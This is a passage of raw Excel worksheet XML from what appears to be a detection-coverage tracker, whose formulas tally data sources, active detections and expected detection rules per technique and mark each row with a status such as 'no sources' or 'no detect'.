        <f t="array" ref="I339">IF(SUM(IF($C339=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C339=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J339" s="9" t="str" cm="1">
        <f t="array" ref="J33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39" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M339" s="9" cm="1">
        <f t="array" ref="M339">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N339" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O339" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P339" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S33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39" t="s">
        <v>999</v>
      </c>
      <c r="U339" t="s">
        <v>1714</v>
      </c>
      <c r="V339" t="s">
        <v>1715</v>
      </c>
      <c r="W339" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="340" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A340" t="s">
        <v>1716</v>
      </c>
      <c r="B340" t="s">
        <v>1716</v>
      </c>
      <c r="C340" t="s">
        <v>170</v>
      </c>
      <c r="D340" t="s">
        <v>1308</v>
      </c>
      <c r="E340" t="s">
        <v>1717</v>
      </c>
      <c r="F340" s="9">
        <f t="shared" si="5"/>
        <v>6</v>
      </c>
      <c r="G340" s="9" cm="1">
        <f t="array" ref="G340">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H340" s="9" cm="1">
        <f t="array" ref="H340">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>5</v>
      </c>
      <c r="I340" s="9" t="str" cm="1">
        <f t="array" ref="I340">IF(SUM(IF($C340=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C340=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J340" s="9" cm="1">
        <f t="array" ref="J34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340" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>5</v>
      </c>
      <c r="M340" s="9" cm="1">
        <f t="array" ref="M340">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>5</v>
      </c>
      <c r="N340" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O340" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P340" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S34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40" t="s">
        <v>425</v>
      </c>
      <c r="U340" t="s">
        <v>1718</v>
      </c>
      <c r="V340" t="s">
        <v>1719</v>
      </c>
      <c r="W340" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="341" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A341" t="s">
        <v>1716</v>
      </c>
      <c r="B341" t="s">
        <v>1720</v>
      </c>
      <c r="C341" t="s">
        <v>1721</v>
      </c>
      <c r="D341" t="s">
        <v>1308</v>
      </c>
      <c r="E341" t="s">
        <v>1566</v>
      </c>
      <c r="F341" s="9">
        <f t="shared" si="5"/>
        <v>1</v>
      </c>
      <c r="G341" s="9" cm="1">
        <f t="array" ref="G341">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H341" s="9" t="str" cm="1">
        <f t="array" ref="H341">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I341" s="9" t="str" cm="1">
        <f t="array" ref="I341">IF(SUM(IF($C341=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C341=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J341" s="9" t="str" cm="1">
        <f t="array" ref="J34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41" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M341" s="9" cm="1">
        <f t="array" ref="M341">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N341" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O341" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P341" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S34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41" t="s">
        <v>430</v>
      </c>
      <c r="U341" t="s">
        <v>1722</v>
      </c>
      <c r="V341" t="s">
        <v>1723</v>
      </c>
      <c r="W341" t="b">
        <v>1</v>
      </c>
      <c r="X341" t="s">
        <v>1716</v>
      </c>
    </row>
    <row r="342" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A342" t="s">
        <v>1716</v>
      </c>
      <c r="B342" t="s">
        <v>1724</v>
      </c>
      <c r="C342" t="s">
        <v>1725</v>
      </c>
      <c r="D342" t="s">
        <v>1308</v>
      </c>
      <c r="E342" t="s">
        <v>1726</v>
      </c>
      <c r="F342" s="9">
        <f t="shared" si="5"/>
        <v>3</v>
      </c>
      <c r="G342" s="9" cm="1">
        <f t="array" ref="G342">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H342" s="9" t="str" cm="1">
        <f t="array" ref="H342">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I342" s="9" t="str" cm="1">
        <f t="array" ref="I342">IF(SUM(IF($C342=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C342=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J342" s="9" t="str" cm="1">
        <f t="array" ref="J34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42" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M342" s="9" cm="1">
        <f t="array" ref="M342">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N342" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O342" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P342" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S34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42" t="s">
        <v>368</v>
      </c>
      <c r="U342" t="s">
        <v>1727</v>
      </c>
      <c r="V342" t="s">
        <v>1728</v>
      </c>
      <c r="W342" t="b">
        <v>1</v>
      </c>
      <c r="X342" t="s">
        <v>1716</v>
      </c>
    </row>
    <row r="343" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A343" t="s">
        <v>1716</v>
      </c>
      <c r="B343" t="s">
        <v>1729</v>
      </c>
      <c r="C343" t="s">
        <v>1730</v>
      </c>
      <c r="D343" t="s">
        <v>1308</v>
      </c>
      <c r="E343" t="s">
        <v>1731</v>
      </c>
      <c r="F343" s="9">
        <f t="shared" si="5"/>
        <v>1</v>
      </c>
      <c r="G343" s="9" cm="1">
        <f t="array" ref="G343">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H343" s="9" t="str" cm="1">
        <f t="array" ref="H343">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I343" s="9" t="str" cm="1">
        <f t="array" ref="I343">IF(SUM(IF($C343=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C343=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J343" s="9" t="str" cm="1">
        <f t="array" ref="J34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43" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M343" s="9" cm="1">
        <f t="array" ref="M343">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N343" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O343" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P343" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S34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43" t="s">
        <v>407</v>
      </c>
      <c r="U343" t="s">
        <v>1732</v>
      </c>
      <c r="V343" t="s">
        <v>1733</v>
      </c>
      <c r="W343" t="b">
        <v>1</v>
      </c>
      <c r="X343" t="s">
        <v>1716</v>
      </c>
    </row>
    <row r="344" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A344" t="s">
        <v>1716</v>
      </c>
      <c r="B344" t="s">
        <v>1734</v>
      </c>
      <c r="C344" t="s">
        <v>1735</v>
      </c>
      <c r="D344" t="s">
        <v>1308</v>
      </c>
      <c r="E344" t="s">
        <v>1566</v>
      </c>
      <c r="F344" s="9">
        <f t="shared" si="5"/>
        <v>1</v>
      </c>
      <c r="G344" s="9" cm="1">
        <f t="array" ref="G344">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H344" s="9" t="str" cm="1">
        <f t="array" ref="H344">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I344" s="9" t="str" cm="1">
        <f t="array" ref="I344">IF(SUM(IF($C344=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C344=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J344" s="9" t="str" cm="1">
        <f t="array" ref="J34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44" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M344" s="9" cm="1">
        <f t="array" ref="M344">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N344" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O344" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P344" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S34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44" t="s">
        <v>861</v>
      </c>
      <c r="U344" t="s">
        <v>1736</v>
      </c>
      <c r="V344" t="s">
        <v>1737</v>
      </c>
      <c r="W344" t="b">
        <v>1</v>
      </c>
      <c r="X344" t="s">
        <v>1716</v>
      </c>
    </row>
    <row r="345" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A345" t="s">
        <v>1716</v>
      </c>
      <c r="B345" t="s">
        <v>1738</v>
      </c>
      <c r="C345" t="s">
        <v>1739</v>
      </c>
      <c r="D345" t="s">
        <v>1308</v>
      </c>
      <c r="E345" t="s">
        <v>1740</v>
      </c>
      <c r="F345" s="9">
        <f t="shared" si="5"/>
        <v>3</v>
      </c>
      <c r="G345" s="9" cm="1">
        <f t="array" ref="G345">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H345" s="9" t="str" cm="1">
        <f t="array" ref="H345">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I345" s="9" t="str" cm="1">
        <f t="array" ref="I345">IF(SUM(IF($C345=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C345=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J345" s="9" t="str" cm="1">
        <f t="array" ref="J34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45" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M345" s="9" cm="1">
        <f t="array" ref="M345">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N345" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O345" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P345" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S34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45" t="s">
        <v>861</v>
      </c>
      <c r="U345" t="s">
        <v>1741</v>
      </c>
      <c r="V345" t="s">
        <v>1742</v>
      </c>
      <c r="W345" t="b">
        <v>1</v>
      </c>
      <c r="X345" t="s">
        <v>1716</v>
      </c>
    </row>
    <row r="346" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A346" t="s">
        <v>1743</v>
      </c>
      <c r="B346" t="s">
        <v>1743</v>
      </c>
      <c r="C346" t="s">
        <v>81</v>
      </c>
      <c r="D346" t="s">
        <v>646</v>
      </c>
      <c r="E346" t="s">
        <v>1744</v>
      </c>
      <c r="F346" s="9">
        <f t="shared" si="5"/>
        <v>11</v>
      </c>
      <c r="G346" s="9" cm="1">
        <f t="array" ref="G346">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H346" s="9" cm="1">
        <f t="array" ref="H346">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>5</v>
      </c>
      <c r="I346" s="9" t="str" cm="1">
        <f t="array" ref="I346">IF(SUM(IF($C346=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C346=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J346" s="9" cm="1">
        <f t="array" ref="J34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346" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>5</v>
      </c>
      <c r="M346" s="9" cm="1">
        <f t="array" ref="M346">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>5</v>
      </c>
      <c r="N346" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O346" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P346" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S34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46" t="s">
        <v>598</v>
      </c>
      <c r="U346" t="s">
        <v>1745</v>
      </c>
      <c r="V346" t="s">
        <v>1746</v>
      </c>
      <c r="W346" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="347" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A347" t="s">
        <v>1743</v>
      </c>
      <c r="B347" t="s">
        <v>1747</v>
      </c>
      <c r="C347" t="s">
        <v>1748</v>
      </c>
      <c r="D347" t="s">
        <v>646</v>
      </c>
      <c r="E347" t="s">
        <v>1749</v>
      </c>
      <c r="F347" s="9">
        <f t="shared" si="5"/>
        <v>5</v>
      </c>
      <c r="G347" s="9" cm="1">
        <f t="array" ref="G347">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H347" s="9" t="str" cm="1">
        <f t="array" ref="H347">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I347" s="9" t="str" cm="1">
        <f t="array" ref="I347">IF(SUM(IF($C347=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C347=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J347" s="9" t="str" cm="1">
        <f t="array" ref="J34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47" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M347" s="9" cm="1">
        <f t="array" ref="M347">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N347" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O347" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P347" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S34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47" t="s">
        <v>658</v>
      </c>
      <c r="U347" t="s">
        <v>1750</v>
      </c>
      <c r="V347" t="s">
        <v>1751</v>
      </c>
      <c r="W347" t="b">
        <v>1</v>
      </c>
      <c r="X347" t="s">
        <v>1743</v>
      </c>
    </row>
    <row r="348" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A348" t="s">
        <v>1743</v>
      </c>
      <c r="B348" t="s">
        <v>1752</v>
      </c>
      <c r="C348" t="s">
        <v>1753</v>
      </c>
      <c r="D348" t="s">
        <v>646</v>
      </c>
      <c r="E348" t="s">
        <v>1754</v>
      </c>
      <c r="F348" s="9">
        <f t="shared" si="5"/>
        <v>6</v>
      </c>
      <c r="G348" s="9" cm="1">
        <f t="array" ref="G348">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H348" s="9" t="str" cm="1">
        <f t="array" ref="H348">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I348" s="9" t="str" cm="1">
        <f t="array" ref="I348">IF(SUM(IF($C348=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C348=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J348" s="9" t="str" cm="1">
        <f t="array" ref="J34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48" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M348" s="9" cm="1">
        <f t="array" ref="M348">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N348" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
